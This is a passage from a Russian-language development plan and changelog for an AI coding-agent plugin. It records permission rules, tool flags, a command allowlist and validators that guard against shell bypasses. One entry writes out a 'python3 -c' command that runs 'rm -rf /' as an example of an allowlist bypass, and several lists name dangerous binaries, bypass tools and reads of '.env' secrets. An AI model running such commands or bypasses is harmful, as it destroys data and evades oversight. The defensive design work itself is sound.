| 2026-09-25 | И1 | **Завершена.** Закрыты D3, D4. Добавлены `core/json.{h,cpp}` (`JsonValue`) и `core/tool.{h,cpp}` (`ToolDef`/`ToolFlags`/`ToolOutput`/`ToolContext`). Реестр хранит `ToolDef`; ручной список инструментов в `prompts.h` удалён, описание генерируется из схем. Валидация аргументов по схеме. Enforcement режимов — в `ToolRunner::run`, покрыты все 50 инструментов. Мигрированы 50 инструментов (base 14, git 7, wp 12, python 6, devops 11). `permission_key` объявлен под И2. Тесты 138 → 174, все зелёные | Смысл `TF_READ_ONLY`: «ничего не меняет», а `EXECUTES` — «умеет запускать». Иначе research запрещал бы `git_status` |
| 2026-09-25 | И0 | **Завершена.** Закрыты D1, D2, D10, D11, D12, D13 + попутно D15–D20. Удалено 17 мёртвых файлов. Версия 0.5.0 единым источником. Тесты 107 → 138, все зелёные. Сборка всего проекта чистая | Баг дедлока воспроизведён намеренно — регрессионный тест его поймал |

### Отклонения от плана

| # | Было | Стало | Почему |
|---|---|---|---|
| 1 | И0.6: «перенести мёртвый код в `attic/`» | Удалить из дерева, история в git | Файлы уже в git — он и есть attic. Копия в `attic/` вернула бы 1500 строк некомпилируемого кода в дерево, то есть ровно ту проблему, которую И0 решает. Вместо копии — `src/README.md` + тест `no_removed_symbols_in_sources` |
| 2 | И0.5: «`load_session` на `JsonValue` после И1; до И1 — заглушка с warn» | Сразу полноценный разбор `json::parse_message_array()` | Формат сессии пишет и читает сам плагин, зависимости от И1 нет. Заглушка оставила бы баг D10 в коде на время разработки И1 |
| 3 | И0.8: «D20 закрыт копированием `plugin.json` рядом с `.so`» | Копируется `wp_coder.json`; хост отбрасывает манифест с чужим `name` | Копия оказалась кандидатом №4 в `find_manifest_path` и не срабатывала никогда — D20 оставался открытым, а общий `plugin.json` в каталоге с 4 плагинами породил D21. Вывод И0.8 был неверен, хотя сам дефект был найден верно |
| 4 | И1.5: «`core/tool_registry.{h,cpp}`» | Расширен существующий `core/tools_registry.{h,cpp}` | Второй реестр рядом с первым — это два источника истины, ровно та болезнь, которую И1 лечит. Имя файла не было архитектурным решением: D-3/D-4 фиксируют `ToolDef` и точку enforcement, а не имя файла |
| 5 | И1.7: «блокировать по `ToolFlags` согласно `mode`/`plan_mode`» | В Research блокируется всё без `TF_READ_ONLY`; в плане — только `EXECUTES`/`DESTRUCTIVE`, а `WRITES_FILES` пропускается через `ToolContext::propose_write` | Полная блокировка записи убила бы механизм «предложенных правок» (`state.pending`, `pending_apply`, панель в UI). Проверки из 4 инструментов убраны, политика живёт в контексте; покрытие стало 50 из 50 вместо 4 |
| 6 | И1.4: флаги `READ_ONLY`/`WRITES_FILES`/`EXECUTES`/… | Те же флаги с префиксом `TF_` | `READ_ONLY`, `EXECUTE` и подобные имена сталкиваются с макросами системных заголовков; префикс снимает риск без изменения смысла |
| 7 | И1.4: `EXECUTES` = «делает что-то» | `READ_ONLY` = «ничего не меняет», `EXECUTES` = «умеет запускать» | Первая трактовка запрещала бы в research `git_status`, `php -l` и `docker ps` — они запускают код, но только читают. Разведение «умения» и «эффекта» дало ровный раскол 25 читающих против 25 меняющих |
| 8 | И0.3: «только добавить `exec_command` в промпт» | Дополнительно гейт на внешние пути | Документировать инструмент, исполняющий произвольный код, без контроля путей — ухудшение. Найдено как D18, закрыто здесь же |
| 9 | И2.1: `enum class Action { Allow, Deny, Ask }` | `enum class PermissionAction`, действие — `PermissionAction` | `coder::Action` в `coder` уже занят структурой вызова инструмента (`core/tool_protocol.h:35`, используется в `ToolArgs` и разборе протокола). Второе `Action` в том же пространстве имён сделало бы `Action::path` и `Action::Ask` неоднозначными для читателя. Смысл правил не менялся |
| 10 | И2.4: дефолты `* → allow`, `doom_loop → ask`, `external_directory → ask`, `read *.env → ask`, `deploy/systemd/ssh → ask` | Перечень расширен до всех групп с `TF_DESTRUCTIVE` (13 ключей) + `git status/diff/log → allow` | План перечислял 5 пунктов, но при `* → allow` любой неперечисленный ключ разрешается молча. Из 19 деструктивных инструментов вне списка оставались 13 — среди них `exec_command`, `wp_cli`, `wp_db`, `docker_run`, `pip_install`. Критерий готовности итерации («все опасные инструменты спрашивают») без этого не выполняется. Инвариант «у каждого `TF_DESTRUCTIVE` ключ спрашивает по умолчанию» закрыт тестом на настоящих инструментах. `read *.env*` вместо `*.env`: `.env.local` и `.env.production` встречаются чаже, лишний вопрос безопаснее лишнего чтения секрета |
| 11 | И2.5: `ask()` «переиспользовать существующий механизм `permission_cv`» | Свой `mtx_`/`cv_` у `PermissionEngine` + короткие захваты `state_.mtx` | `state_.mtx` нерекурсивный и общий с UI (D1). Ожидание с удержанием `state_.mtx` означало бы, что UI не может прочитать состояние, пока агент висит на вопросе, — то есть ровно тот висящий GUI. Свой мьютекс даёт независимый порядок блокировок: `PermissionEngine` никогда не берёт `state_.mtx`, удерживая свой. Отдельный регрессионный тест держит UI под `state_.mtx` во время ожидания, со сторожем на случай инверсии |
| 12 | И2.8: `visible_tools(all)` — убирать denied-инструменты из схемы | + `load_user_rules(json)` из настройки `wp_coder.permission_rules` | Запреты были бы недостижимы: единственный путь, менявший правила, — `approve()`, а он добавляет только `Allow`. `visible_tools` получился бы мёртвым кодом, а критерий итерации («denied-инструменты не видны модели») — недостижимым. Правка правил в UI отнесена к И8 (конфиг-агенты) |
| 13 | И2.9: «заполнить `permission_key` у каждого из 50 инструментов» | 14 групп, а не 50 ключей | Ключ — это то, на что отвечает пользователь: «всегда разрешить деплой» не должно разрешать `docker`, и одно правило должно покрывать `exec_command` и `python_run`. 50 отдельных ключей означали бы 50 вопросов с одинаковым смыслом. Словарь ключей закрыт тестом — опечатка создала бы ключ без правил |
| 14 | И2.4: `external_directory → ask` | Правило проверяет существующий `PermissionGate`, который продолжает владеть и списком путей, и состоянием ожидания | Два конкурирующих гейта на один вопрос означали бы два источника истины (болезнь, которую лечит И1). `PermissionGate` спрашивает, движок решает; «всегда» из гейта пишется и в правила, и в сохраняемый список |
| 15 | И13.10: «версия `0.6.0`» | Версия поднимается на каждой итерации; на И3 это 0.8.0, и задача 13.10 переписана без указания версии | 0.6.0 заняла И1, 0.7.0 — И2, 0.8.0 — И3. Каждая итерация с изменением поведения для пользователя поднимает версию, поэтому фиксировать её в задаче будущей итерации бессмысленно: версия в тексте плана устареет снова |
| 16 | И3.1: `CommandPolicy { allowed_binaries; arg_rules; }` | + `trusted_hosts` (доверенные сетевые хосты) | Требование 3.4 «curl/wget — только allowlisted хосты» без этого поля было бы недостижимо, а реализация «запрещать всё» не годилась бы: `verify()` и `wp_check_deps` ходят по собственному сайту, и каждый такой вызов превращался бы в отказ. Список **допустимых**, а не недопустимых: имя хоста придумать можно любое, поэтому deny-список не работал бы никогда. Штатно доверен только localhost; `Engine` подкладывает `wp_site_url`/`wp_local_url` из настроек — тем же приёмом, что `apply_agent_defaults(trusted_dirs)` в И2.4 |
| 17 | И3.4: перечень валидаторов (`git`, `sudo`, `curl`/`wget`, `rm`, `dd`, `mkfs`) | + универсальные обходы (`sh`, `env`, `xargs`, `nohup`, `eval`, `su`, `find -exec`), код из строки у интерпретаторов, опасные переменные окружения, персистентные хуки `git config` | План перечислил 6 бинарников, и этого мало по той же причине, по которой не хватало blocklist из 9 подстрок. allowlist обходится одной строкой, если в списке нет `sh`: `python3 -c 'import os; os.system("rm -rf /")'` проходил бы при любом allowlist, если бы в нём не было запрета на `-c`. Тот же класс, что закрыт в И2.4: критерий итерации («опасное запрещено») без этого не выполняется. Инвариант «запуск ФАЙЛА разрешён, программа из АРГУМЕНТА — нет» закрыт тестом |
| 18 | И3.6: «заменить `is_command_allowed` на `CommandPolicy` в `exec_command`; добавить политику в `git_*`, `deploy`, `systemd_*`, `docker_*`, `ssh_exec`, `wp_cli`» | Два режима (`check` / `check_assembled`) и подключение в обёртке `shell::run_capture*` | (1) Перечислить семь групп инструментов значило бы семь проверок, которые легко забыть в 43-й; обёртка — единственное место, где собранная плагином команда уходит в процесс, и проверка там не может быть забыта новым инструментом. (2) allowlist неприменим к собранным командам: `deploy` выполняет `./deploy.sh`, `wp_create_site` зовёт `sudo mariadb`, `php_lint` запускает `/usr/bin/php8.1` — там бинарник выбрал код, и список дал бы ложные отказы вместо защиты. Все **запреты** при этом действуют в обоих режимах, что и проверено тестом. Критерий итерации (произвольные команды) достигается в строгом режиме |
| 20 | И4.1: `core/glob.h` | `core/glob.h` + `core/glob.cpp` | Алгоритм (разбор шаблона, `{}`-раскрытие, мемоизация `**`, обход) — около 200 строк. В заголовке он означал бы, что его пересобирает каждый, кто подключает `glob.h`, а репозиторий уже разделяет `.h`/`.cpp` (`permission`, `command_policy`) |
| 21 | И4.1: неймспейс `glob` | `fileglob` | `glob` — функция POSIX, а `<glob.h>` подтягивается через `<filesystem>`. `glob::Options` не разрешалось: ошибка выглядела как «`fileglob` has not been declared» при вполне верном коде |
| 22 | И4.1: инструмент `glob { pattern, path }` | `+ include` (фильтр расширений) | «Фильтры по расширению» из той же строки плана недостижимы без параметра: альтернатива — внутренний код, который никто не зовёт (тот же класс, что И0.9 с заглушками `project.cpp`). Строка через запятую, а не массив: массив объектов малые модели путают, а здесь это единственный сложный аргумент инструмента |
| 23 | И4.1: порядок стадий каскада: `WhitespaceNormalized` (4) → `IndentationFlexible` (5) → `TrimmedBoundary` (7) | `IndentationFlexible` (4) → `TrimmedBoundary` (5) → `WhitespaceNormalized` (6) | Стадия, которую полностью перекрывает более широкая следующая, недостижима: `WhitespaceNormalized` игнорирует любой пробел, значит и отступы, и граничные пробелы, и обе стадии перед ней были бы мёртвым кодом. Порядок «от строгого к размытому» требует более строгие раньше — это и есть смысл каскада. `BlockAnchor` оставлен третьим, как в плане |
| 24 | И4.3: `MultiOccurrence` заменяет все вхождения | Только при явном `replace_all` | Без флага «замени `return`» молча переписал бы пол-файла, и агент узнал бы об этом из diff постфактум. Стадия осталась в каскаде и включается осознанно |
| 25 | И4.5: `Semaphore(1)` на `filePath` (opencode — асинхронный) | Полосы из 64 мьютексов по хешу пути | Карта путей требовала бы общего мьютекса и `weak_ptr` ради единственного выигрыша — не блокировать несвязанные файлы, — который тут не нужен: два разных файла на одной полосе ждут друг друга миллисекунды. Побочных эффектов меньше: ничего не выделяется и не может утечь. Плюс `Engine::pending_apply` переписан так, чтобы **не** держать `state_.mtx` поверх файлового семафора: инструменты берут их в обратном порядке, и инверсия дала бы взаимный дедлок UI с worker-потоком |
| 26 | И4.7: `read { filePath, offset, limit }` | `read_file { path, offset, limit }`, `k` убран | Имя инструмента и имя параметра пути в коде — одни на 50 инструментов (`path`). Второе имя для того же означало бы, что в промпте у модели два способа сказать одно и то же. `k` означал «пропустить N строк» — это и есть `offset`, а параметра «прочитать N строк» не было вовсе |
| 27 | И4.8: `bash` «заменяет `exec_command`» | Переименование выполнено, `exec_command` удалён | Промежуточного варианта («оба имени на один инструмент») не делалось намеренно: два имени у одного инструмента — тот же дрейф, что закрыт в И1. Ссылки на старое имя в комментариях переименованы тем же sed-проходом: комментарий про несуществующий инструмент — это ровно та рассинхронизация, из-за которой был D2 |
| 28 | И4.9: отдельный инструмент `list` | `list_dir` заменён на `list { depth }` | Инструмент с глубиной уже был — одним уровнем. Второй рядом с ним означал бы два инструмента с одним смыслом, то есть ровно та двойственность, которую И1 убрала из реестра. Обход с ограничением глубины добавлен в `glob::Options`, а не написан вторым: два обхода разошлись бы по правилам пропуска каталогов |
| 29 | И4.10: усечение в `ToolRunner` | В `ToolsRegistry::run_output` | `ToolRunner` — не единственный вызывающий: панель предпросмотра в UI зовёт реестр напрямую. Проверка в `ToolRunner` обходилась бы вторым путём и рано или поздно обошлась бы, а забытый предел стоит целого запроса к модели. Правило уступает инструменту, который усек вывод сам: у `bash` это осознанный хвост, и обрезка по началу уничтожила бы ровно то, ради чего кольцо |
| 30 | (вне задач итерации) Тест `git_tools_work_in_real_repo` проверял отсутствие подстроки `cd` | Проверяется `failed to run 'cd'` | `git commit` печатает хеш, и примерно в 2 % прогонов он содержит `cd` (`3fcd812`): тест падал по случайной причине, и это учило игнорировать красное. Свойство D22 в новой форме: проверка, которая ловит не то, что должна |
| 31 | (вне задач итерации) Сторож в `tests/test_framework.h` | 30 с на тест, выход кодом 3 | Два теста за итерацию зависли (дедлок в тесте семафора, слишком длинный таймаут команды). Зависание в CI — это загадка без номера теста; сторож превращает её в диагноз. Стоимость — 30 строк, и он сработал на первом же прогоне |
| 32 | (вне задач итерации) Копия манифеста `plugins/wp_coder.json` | Синхронизирована с `plugin.json`; тест сравнения указывал на несуществующий путь и пропускал расхождение молча | Копия отстала до **0.6.0** при `plugin.json` 0.9.0 — болезнь D12 в третий раз, уже после D20/D21. Причина не в копии, а в проверке: путь был на уровень выше (`<корень репо>/wp_coder.json`), файла там нет, тест возвращался и **не мог упасть**. Исправлен и **проверен мутацией**: с подставленной старой версией в копии тест падает с указанием обеих версий |
| 19 | Правило передачи сессии: напоминалка для новой сессии | Отдельный файл `SESSION_START.md` + правило в §4, изменяемые данные (§4 плана, `CHANGELOG.md`) из него исключены | Текст в чате умирает вместе с окном и не попадает в `git diff` — его нельзя ни проверить, ни откатить. Но напоминалка с номером коммита и числом тестов хуже, чем её отсутствие: следующая сессия поверит протухшему числу (тот же класс, что D22 с бинарниками месячной давности). Поэтому файл несёт только «как работать» (база, ограничения, порядок, что читать), а «что сделано и что дальше» остаётся в §4. Инвариант закреплён тестом `session_start_file_has_no_volatile_data`, проверен мутацией |

---

## 5. Что делать **первым** (порядок запуска)

1. **И0** — снять P0-дедлок и выбросить мёртвый код. Без этого любые дальнейшие изменения в `agent_components.cpp` рискуют дублировать баг или конфликтовать с заблуждающими комментариями.
2. **И1 + И2 + И3** — фундамент. И1 даёт типизацию, без которой И4 (новые инструменты) превратится в тот же 4-файловый хаос; И2/И3 закрывают P1-дыры в безопасности.
3. **И5 + И6** — событийная модель и стриминг. Это то, что делает агент «живым» для пользователя и что нужно И7 (компакшн по реальным токенам) и И8 (дочерние сессии).
4. **И4 + И7 + И8** — основная функциональность.
5. **И9–И13** — качество опыта и барьеры входа.

**Оценка суммарно:** ~45 человеко-дней. Волна A — недели 1–2, Волна B — недели 3–6, Волна C — недели 7–8, Волна D — недели 9–10.

### Что можно делать параллельно

- И6.1–6.3 (правки хоста: `plugin_api.h`, `plugin_manager.cpp`, `llama_interface.h`) — независимы от внутренней работы плагина.
- И11 (UI) — рисует по событийной модели И5, но может проектироваться параллельно.
- И13.5 (`llm_ast_symbols`) — независимый кусок работы по хосту.

### Точки принятия решений, требующие подтверждения

| # | Вопрос | Рекомендация |
|---|---|---|
| Q1 | Расширять ли ABI хоста (`llm_chat_stream`, `llm_ast_symbols`)? | Да. Без стриминга агент неотличим от текущего по ощущениям; append-only совместим |
| Q2 | Совместимость со старыми хостами | Обязательна — `offsetof`-probe обязателен везде |
| Q3 | Нужен ли `explore`-агент в первой поставке? | Да, И8.6 — самый быстрый выигрыш на длинных задачах |
| Q4 | Транспорт для `background`-субагентов (И8.14) | Отложить до M6 — это самая дорогая часть И8 |
| Q5 | Переносить ли `LSP`-тулз из opencode | Не в этом цикле; при наличии спроса — отдельная итерация |
